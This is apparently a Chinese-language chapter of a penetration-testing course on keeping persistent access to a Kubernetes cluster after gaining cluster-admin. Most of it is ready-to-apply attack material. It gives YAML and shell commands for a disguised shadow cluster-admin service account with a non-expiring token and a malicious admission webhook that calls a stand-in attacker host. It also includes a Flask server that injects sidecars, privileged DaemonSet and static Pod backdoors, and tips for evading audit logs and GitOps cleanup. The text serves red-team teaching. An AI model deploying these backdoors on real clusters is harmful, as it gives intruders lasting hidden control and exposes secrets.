# Ch 29 — K8s 持久化：Shadow Admin 與惡意 Admission Webhook

> **目標**：掌握攻擊者在取得 K8s cluster-admin 後如何埋設多層後門，讓存取權在原始漏洞被修補、帳號被撤銷後仍能存活；理解每種持久化機制的生存邊界與偵測盲點，為 Ch30 進入托管 K8s 的差異做準備。

---

## 為什麼需要

滲透測試教科書的思路是「拿到 root 就算成功」，但在 K8s 環境這個邏輯會讓你在客戶修補漏洞後當場失去所有存取。K8s 的控制面（control plane）是純 API 驅動的，RBAC 物件、Admission Webhook、靜態 Pod 都是「寫進 etcd 就能存活」的持久化面。與 Ch14 的雲端 IAM 持久化平行：IAM role 是雲端控制面的後門，ClusterRoleBinding 是 K8s 控制面的後門。

差別在於 K8s 的持久化物件更容易混入系統組件，因為 `kube-system` namespace 本來就有幾十個 SA、Secret、DaemonSet，命名慣例又允許你用 `system:` 前綴冒充核心組件。

---

## 先建直覺

```
攻擊者取得 cluster-admin
│
├── 控制面物件（etcd 層）
│   ├── Shadow SA + ClusterRoleBinding  ←─ 即使原始帳號被撤銷仍存活
│   ├── MutatingWebhookConfiguration   ←─ 攔截所有 Pod 建立，注入側車
│   └── CronJob 後門                    ←─ 定期執行，低曝光時間
│
└── 節點層（Node 層）
    ├── DaemonSet（kube-system）         ←─ 每節點都跑，自動重啟
    └── Static Pod（/etc/kubernetes/manifests/）
        └── kubelet 直接啟動，不經 API Server 排程
            ↓
            在 kubectl get pods 顯示為 mirror pod（名稱加節點後綴）
            無法透過 kubectl exec 進入

清理行動               後門存活狀況
────────────────────────────────────────────
撤銷攻擊者的 kubeconfig  Shadow SA token 仍有效
刪除攻擊者建立的 Pod     DaemonSet 立即重建
重啟 API Server          Static Pod 不受影響
GitOps 同步回 git 狀態   需要額外策略對抗（見踩雷 5）
```

每條路徑的生存能力不同，實戰中要同時埋至少兩層：控制面 RBAC + 節點層靜態 Pod，確保互相備援。

---

## 底層機制

### 1. Shadow Cluster-Admin（影子叢集管理員）

RBAC 持久化的核心概念：ClusterRoleBinding 是叢集層級物件，只要物件存在於 etcd，繫結的 SA 就永遠有 cluster-admin 權限。攻擊者的原始進入路徑（例如被攻陷的 Pod、洩漏的 kubeconfig）被撤銷後，這個 binding 完全不受影響。

偽裝手法：在 `kube-system` namespace 建立 SA，命名成 `metrics-collector`、`node-problem-detector`、`kube-state-exporter` 等看起來像監控元件的名稱，讓 SRE 巡視時不起疑。

```yaml
# shadow SA 藏在 kube-system（本身就有幾十個 SA，不突兀）
apiVersion: v1
kind: ServiceAccount
metadata:
  name: metrics-collector
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: system:metrics-collector:admin
subjects:
- kind: ServiceAccount
  name: metrics-collector
  namespace: kube-system
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

K8s 1.24 之後，SA 不再自動建立長效 token。要取得一個永不過期的 token 需要明確建立 `kubernetes.io/service-account-token` 類型的 Secret：

```yaml
apiVersion: v1
kind: Secret
metadata:
  name: metrics-collector-token
  namespace: kube-system
  annotations:
    kubernetes.io/service-account.name: metrics-collector
type: kubernetes.io/service-account-token
```

kubelet 會填充 `data.token`，這個 token 沒有 TTL，可以直接當 `kubectl --token=<base64-decoded>` 使用。代價是每次使用都會出現在 API Server audit log，欄位 `user.username` 會是 `system:serviceaccount:kube-system:metrics-collector`。

### 2. 惡意 MutatingAdmissionWebhook（變更准入 Webhook）

這是隱蔽性最高的持久化方式，原理：

API Server 在建立 Pod 時，會按順序呼叫所有已註冊的 MutatingAdmissionWebhook。攻擊者控制的 webhook server 可以在每個 Pod 的 spec 裡注入側車容器（sidecar）、環境變數（environment variable）、volumeMount，或直接讀取 Pod 的 Secret。ValidatingAdmissionWebhook（驗證准入 Webhook）同理，可以在 validation 階段竊取所有 CREATE/UPDATE 請求的 payload，包含 Secret 的明文值。

`MutatingWebhookConfiguration` 是叢集層級物件，不屬於任何 namespace，不會因為清理工作負載而被刪除。

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: system-pod-validator   # 偽裝成合法的 validator
webhooks:
- name: pod-injector.system.svc
  clientConfig:
    url: "https://attacker-server.example.com/inject"
    # 若用叢集內 Service 則改用 service 欄位 + caBundle
  rules:
  - apiGroups: [""]
    apiVersions: ["v1"]
    operations: ["CREATE"]
    resources: ["pods"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Ignore      # 關鍵：攻擊者伺服器掛掉時 Pod 仍可建立，不引發警報
  namespaceSelector: {}      # 空值 = 所有 namespace（含 kube-system）
```

`failurePolicy: Ignore` 是隱蔽性的核心設計。若設為 `Fail`（預設），攻擊者伺服器離線時叢集所有 Pod 建立都會失敗，立即引發告警。設為 `Ignore` 則服務不受影響，攻擊者伺服器上線時才開始攔截。

Webhook server 的注入邏輯（概念）：

```python
# attacker webhook server（示意，非完整程式碼）
from flask import Flask, request, jsonify
import base64, json

app = Flask(__name__)

@app.route("/inject", methods=["POST"])
def inject():
    review = request.get_json()
    pod_spec = review["request"]["object"]["spec"]

    # 注入側車：掛載 hostPath 讀取節點 /etc/kubernetes/pki
    sidecar = {
        "name": "log-forwarder",
        "image": "attacker.example.com/logger:latest",
        "volumeMounts": [{"name": "pki", "mountPath": "/pki"}]
    }
    pod_spec["containers"].append(sidecar)

    # 也可以竊取 pod 的 SA token，因為整個 pod spec 都在 request payload 裡
    patch = [{"op": "add", "path": "/spec/containers/-", "value": sidecar}]
    encoded = base64.b64encode(json.dumps(patch).encode()).decode()

    return jsonify({
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview",
        "response": {
            "uid": review["request"]["uid"],
            "allowed": True,
            "patchType": "JSONPatch",
            "patch": encoded
        }
    })
```

### 3. DaemonSet 後門

DaemonSet（常駐集）確保每個節點都跑一個 Pod，且 Pod 死掉後 kubelet 立即重建。對攻擊者而言，這等於在每個節點上維持一個常駐後門。

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-agent          # 不要用 backdoor，用 node-agent/log-collector
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: node-agent
  template:
    metadata:
      labels:
        app: node-agent
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: node-agent
        image: busybox
        command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]
        securityContext:
          privileged: true
        volumeMounts:
        - name: host-root
          mountPath: /host
      volumes:
      - name: host-root
        hostPath:
          path: /
      tolerations:
      - operator: Exists    # 同時跑在控制面節點（有 node-role.kubernetes.io/control-plane taint）
```

`tolerations: - operator: Exists` 配對所有 taint，包含控制面節點預設的 `node-role.kubernetes.io/control-plane:NoSchedule`，確保 DaemonSet 跑在叢集每一個節點上。

### 4. Static Pod（靜態 Pod）

靜態 Pod 的 manifest 直接放在節點的 `/etc/kubernetes/manifests/`，kubelet 監控這個目錄，有新檔案就啟動，不需要 API Server 介入。這表示即使 API Server 被重啟或 etcd 被清空，靜態 Pod 都會繼續跑。

```bash
# 需要先取得節點的 shell（透過 DaemonSet privileged + hostPath 或 SSH）
cat > /etc/kubernetes/manifests/system-helper.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: system-helper
  namespace: kube-system
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: system-helper
    image: busybox
    command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
```

靜態 Pod 在 API Server 裡會以「鏡像 Pod（mirror pod）」形式出現，名稱格式是 `<pod-name>-<node-name>`，例如 `system-helper-node01`。這個 mirror pod 是唯讀的，`kubectl exec` 或 `kubectl delete` 都不會真的影響它，刪掉 mirror pod 後 kubelet 幾秒內就重建。

### 5. CronJob 後門

CronJob（排程工作）相對低調：不是持續跑的 Pod，只在排程時段出現。每次執行後 Pod 結束，log 很快被 GC 清掉。

**本段未實測，為理論預期行為**：CronJob 可設定 `successfulJobsHistoryLimit: 0` 和 `failedJobsHistoryLimit: 0`，讓 K8s 不保留任何執行記錄，進一步降低稽核可見度。

---

## 範例一：建立 Shadow Cluster-Admin 並驗證

```bash
# 假設已有 cluster-admin 存取
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: ServiceAccount
metadata:
  name: metrics-collector
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: system:metrics-collector:admin
subjects:
- kind: ServiceAccount
  name: metrics-collector
  namespace: kube-system
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Secret
metadata:
  name: metrics-collector-token
  namespace: kube-system
  annotations:
    kubernetes.io/service-account.name: metrics-collector
type: kubernetes.io/service-account-token
EOF

# 等 token 被填充（通常 2-3 秒）
sleep 3

# 取出 token
TOKEN=$(kubectl get secret metrics-collector-token \
  -n kube-system \
  -o jsonpath='{.data.token}' | base64 -d)

# 驗證：用這個 token 查叢集節點（cluster-admin 才能查）
kubectl get nodes --token="$TOKEN" \
  --server="https://$(kubectl get endpoints kubernetes -o jsonpath='{.subsets[0].addresses[0].ip}'):6443" \
  --insecure-skip-tls-verify
```

預期輸出是節點清單。此時即使把原本的 kubeconfig 撤銷，`$TOKEN` 仍然有效，直到有人手動刪除 Secret 或 ClusterRoleBinding。

---

## 範例二：部署惡意 MutatingWebhookConfiguration

**前置條件**：攻擊者需要一個對外可達且有合法 TLS 憑證的 HTTPS 伺服器，或在叢集內有 Service。

```yaml
# 若使用叢集外的 URL，caBundle 欄位可省略但 API Server 必須能驗證憑證
# 若用叢集內 Service，需提供 CA bundle（PEM base64 encoded）
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: system-pod-validator
webhooks:
- name: pod-injector.system.svc
  clientConfig:
    url: "https://attacker-server.example.com/inject"
  rules:
  - apiGroups: [""]
    apiVersions: ["v1"]
    operations: ["CREATE"]
    resources: ["pods"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Ignore
```

```bash
kubectl apply -f malicious-webhook.yaml

# 驗證 webhook 已註冊
kubectl get mutatingwebhookconfigurations

# 建立任意 Pod，觀察 attacker server 的 log 是否收到請求
kubectl run test-pod --image=nginx --restart=Never
```

Webhook server 收到的 `request.object` 包含 Pod 的完整 spec，包括透過 `envFrom.secretRef` 引用的 Secret 名稱（不含值），以及 `serviceAccountName`。若 Pod 直接把 Secret 放進 env 裡，值也會出現在 webhook payload。

---

## 範例三（邊界案例）：failurePolicy: Fail vs Ignore 的影響

```bash
# 修改 webhook 為 failurePolicy: Fail，然後讓 attacker server 離線
kubectl patch mutatingwebhookconfiguration system-pod-validator \
  --type='json' \
  -p='[{"op":"replace","path":"/webhooks/0/failurePolicy","value":"Fail"}]'

# 嘗試建立 Pod（攻擊者 server 已離線）
kubectl run test2 --image=nginx --restart=Never
```

預期輸出：

```
Error from server (InternalError): Internal error occurred:
failed calling webhook "pod-injector.system.svc":
failed to call webhook: Post "https://attacker-server.example.com/inject":
dial tcp ...: connect: connection refused
```

**所有 Pod 建立請求都會失敗**，叢集 on-call 工程師幾分鐘內就會收到告警。相比之下，`failurePolicy: Ignore` 讓服務完全不受攻擊者伺服器的可用性影響，是實際攻擊中唯一合理的選擇。

---

## 對比取捨表

| 持久化機制 | 生存範圍 | 偵測難度 | 能力 | 部署前提 |
|---|---|---|---|---|
| Shadow SA + ClusterRoleBinding | etcd 層，不受 Pod 清理 | 中（ClusterRoleBinding 可審計） | 完整 API 存取 | cluster-admin |
| MutatingWebhookConfiguration | etcd 層，叢集層級物件 | 高（偽裝成合法元件） | 攔截所有 Pod，注入側車 | cluster-admin + 外部 HTTPS |
| DaemonSet | etcd 層 + 每個節點 | 中（kube-system 有很多 DS） | 節點 shell + hostPath | cluster-admin |
| Static Pod | 節點檔案系統 | 高（不經 API Server）| 節點完整存取 | 節點 shell（寫 /etc/kubernetes/manifests/）|
| CronJob | etcd 層 | 低（定期出現，log 短暫）| 定期執行任意命令 | cluster-admin |

---

## 踩雷集錦

**1. Webhook 的 caBundle 是硬性要求**

API Server 必須驗證 webhook server 的 TLS 憑證。若用 `url` 欄位指向外部伺服器，伺服器的 CA 必須被 API Server 信任（通常是公開 CA 即可）。若用叢集內 Service，`caBundle` 欄位必須填入簽署 webhook server 憑證的 CA 的 PEM（base64 encoded）。忘記填或填錯會讓 webhook 建立失敗，或者 API Server 拒絕所有呼叫（即使 `failurePolicy: Ignore` 也不救，因為 TLS 握手失敗是連線層問題，不是 webhook 回應失敗）。

**2. Static Pod 的 mirror pod 無法 exec**

Static Pod 在 API Server 顯示為鏡像 Pod，名稱帶節點後綴。`kubectl exec system-helper-node01 -- /bin/sh` 會收到錯誤，因為 API Server 無法透過 kubelet streaming API 連進靜態 Pod。要進入靜態 Pod，只能直接 SSH 到節點再用 `crictl exec`。防守方同理，`kubectl delete` 刪不掉它，只有刪除節點上的 manifest 檔案才有效。

**3. 長效 SA token 的審計可見度**

`kubernetes.io/service-account-token` 類型的 Secret 產生的 token 沒有過期，但每次呼叫 API Server 都會在 audit log 留下 `user.username: system:serviceaccount:kube-system:metrics-collector`。若叢集有 SIEM（安全資訊及事件管理，Security Information and Event Management）整合 audit log，這個帳號的活動會形成可分析的行為模式。相比之下，短效的 projected token 不在 audit log 留下每次使用記錄，但攻擊者每次都要重新取得 token。實際攻擊中，長效 token 的使用要刻意保持低頻，避免觸發異常偵測規則。

**4. DaemonSet 跑在控制面節點需要正確的 toleration**

控制面節點預設有 taint `node-role.kubernetes.io/control-plane:NoSchedule`。若 DaemonSet 的 `tolerations` 沒有涵蓋這個 taint，Pod 不會被排程到控制面節點，等於放棄了 API Server 所在節點的持久化。`tolerations: - operator: Exists` 是最暴力也最完整的寫法，配對叢集裡所有可能的 taint。

**5. GitOps 工具會主動刪除你的後門**

如果叢集用 ArgoCD 或 Flux 管理，任何與 git 倉庫狀態不符的物件都會被定期同步回去（根據設定，可能是刪除多餘物件）。攻擊者的 Shadow SA 和 DaemonSet 不在 git 裡，會被 GitOps 清掉。對抗方式：

- Static Pod（在節點檔案系統，不受 GitOps 管控）
- 在 ArgoCD Application 裡設定 `ignoreDifferences`（需要 cluster-admin 才能改 Application）
- 把後門物件加上 `argocd.argoproj.io/managed-by` 標籤偽裝成受管物件（需要實驗特定版本行為，**本段未實測，為理論預期行為**）

---

## 進階延伸

**對抗 audit log 的 impersonation**：API Server 支援 impersonation header（`Impersonate-User`），有 `impersonate` 權限的 SA 可以假冒其他身份執行請求。audit log 會記錄「被假冒者」的行為，但 `impersonatedUser` 欄位會出現在 log 裡，仍可被找到，只是需要更細的查詢條件。

**Webhook 作為 C2 信道**：MutatingWebhook 不只能注入 sidecar，webhook server 還能在 response 裡帶一些 annotation，讓注入的 sidecar 讀取，形成從 C2 伺服器到 Pod 內的單向指令傳遞。結合 Pod 到外部的出口流量，可以建立完整的 C2 信道而不需要攻擊者主動連進叢集。

**etcd 直接存取**：若能存取 etcd 的 2379 port（通常只在控制面節點上），可以直接讀寫所有 K8s 物件，繞過 API Server 的 RBAC 和 audit log。etcd 資料是 protobuf 格式，用 `etcdctl` 讀取後直接修改 ClusterRoleBinding，這種方式完全不出現在 API Server audit log 裡。

---

## 本章重點整理

- ClusterRoleBinding 是 etcd 層持久化的基礎，與原始存取路徑解耦，偽裝名稱讓稽核困難。
- MutatingAdmissionWebhook 是攔截面最廣的後門：一個物件就能影響叢集所有 Pod 建立，`failurePolicy: Ignore` 是隱蔽的關鍵。
- DaemonSet 在節點層持久化，`tolerations: - operator: Exists` 確保跑在控制面節點。
- Static Pod 存在節點檔案系統，kubelet 直接管理，不受 API Server 清理、不受 GitOps 影響，但需要節點 shell。
- 長效 SA token 沒有 TTL，但每次使用留下 audit log；使用頻率要壓低。
- GitOps 工具是後門的剋星，Static Pod 是唯一完全不受其影響的機制。

---

## 自我檢核

1. ClusterRoleBinding 被刪除後，已簽發的 SA token 是否立即失效？（想想 token 驗證的流程）
2. `failurePolicy: Ignore` 的 webhook 在攻擊者伺服器完全離線時，對叢集正常運作有什麼影響？
3. 用 `kubectl delete pod system-helper-node01 -n kube-system` 刪掉 mirror pod 之後，靜態 Pod 幾秒後重建。要永久移除它需要什麼操作？
4. 如果叢集的 ArgoCD Application 設定 `prune: true`，攻擊者的 Shadow SA 在下一次 GitOps sync 後會發生什麼？
5. 防守方執行 `kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects'` 能找到 Shadow SA 嗎？這個指令有什麼盲點？

---

## 延伸閱讀

1. [MITRE ATT&CK for Containers — Persistence](https://attack.mitre.org/tactics/TA0003/) — 容器/K8s 持久化的 MITRE 分類，T1078（Valid Accounts）和 T1610（Deploy Container）是對應 tactic。
2. [Kubernetes Security: Webhook Auditing](https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/) — 官方 audit policy 設定，理解防守方能看到什麼才能知道如何規避。
3. [Bad Pods: Kubernetes Pod Privilege Escalation](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation) — Bishop Fox 對各種 Pod 配置（privileged/hostPID/hostNetwork）的系統性分析，與 DaemonSet 後門直接相關。
4. [Falco Rules for Kubernetes Persistence](https://falco.org/docs/rules/) — Falco 針對 kube-system 異常 Pod、特權容器、webhook 建立的預設規則，是了解防守偵測能力的最快途徑。
5. **KubeCon 議程「Detecting Kubernetes Attacks with Audit Logs」** — 實際展示如何用 audit log 偵測 ClusterRoleBinding 建立和 webhook 濫用。在 YouTube 搜尋 `KubeCon audit logs detection` 可找到歷年多場相關議程；先看 audit policy 設定段，再看 detection query 範例。

---

Ch29 把 K8s 持久化的六種機制從 etcd 層到節點層全部走過一遍；Ch30 要面對的是托管 K8s（EKS/GKE/AKS），控制面不在你手上，上述的部分攻擊面會消失，但雲端 IAM 和托管節點組帶來新的進入點，見 [Ch30 — 托管 K8s 的攻擊面差異](30-managed-k8s.md)。
